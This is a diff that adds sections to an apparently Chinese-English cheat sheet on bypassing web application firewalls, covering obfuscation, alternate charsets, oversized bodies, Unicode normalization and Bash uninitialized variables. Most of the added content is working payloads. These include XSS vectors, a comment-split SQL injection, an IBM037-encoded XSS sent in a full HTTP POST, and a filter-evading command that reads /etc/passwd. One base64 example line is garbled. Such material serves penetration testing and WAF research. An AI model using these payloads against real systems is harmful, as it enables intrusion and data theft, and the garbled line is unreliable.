@@ -31,11 +31,40 @@ https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-w
     - 額外字符 : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa href=javascript:alert(1)>xss</a">"
 
 ## Obfuscation 混淆 
+- Function( "ale" + "rt(1)" )(); #使用除了 alert、console.log 和 prompt 之外的不常見函數javascript
+- /? id =1+un/**/ion+sel/**/ect+1,2,3-- #在 SQL 查詢中使用註解來分解語句
+- new Function`alt\`6\``; #使用反引號而不是括號
+- data:text/html; base64 4mPHxNv564Fx2Fv)5(Q/html; base2W.編碼 javascript %26%2397;lert(1) #使用 HTML 編碼
+- <a src= "%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm ( XSSDY #$%&()*~+-_.,:;?@[/|\]^`=confirm()> # 在事件處理程序和等號之間使用任何非字母、數字或封裝字元（僅適用於 Gecko 引擎）
 
 ## Charset 字元集
+- 修改Content-Type標頭以使用不同的字元集（例如ibm500）
+- Python
+$ python3  <br>
+-- snip --  <br>
+>>>  import urllib.parse <br>
+>>>  s = '<script>alert("xss")</script>' <br>
+ >>>  urllib.parse.quote_plus(s.encode( "IBM037" )) <br>
+ 'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n' <br>
+
+- 將編碼後的字串傳送到請求正文中並上傳到伺服器
+POST /comment/post HTTP/1.1 <br>
+Host: chatapp <br>
+Content-Type: application/x-www-form-urlencoded; charset=ibm500 <br>
+Content-Length: 74 <br>
+%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3 <br>
 
 ## Content Size 內容大小
-
+- 如果有效負載超過一定大小，則不會檢查請求
+- add gibberi e.g 8kb char
 ## Unicode Compatibility
-
+- 將視覺上不同的字元分解為相同的基本抽象字元
+- NFC：規範化形式規範組合
+- NFD：規範化形式規範分解
+- NFKC：規範化形式相容性組合
+- NFKD：範式相容性分解
+e.g ＜img src=p onerror='prompt(1)'> --> ＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
 ## Uninitialized Variables 未初始化
+- Bash 將未初始化的變數視為空字串
+- echo $u
+- cat$u /etc%u/passwd$u
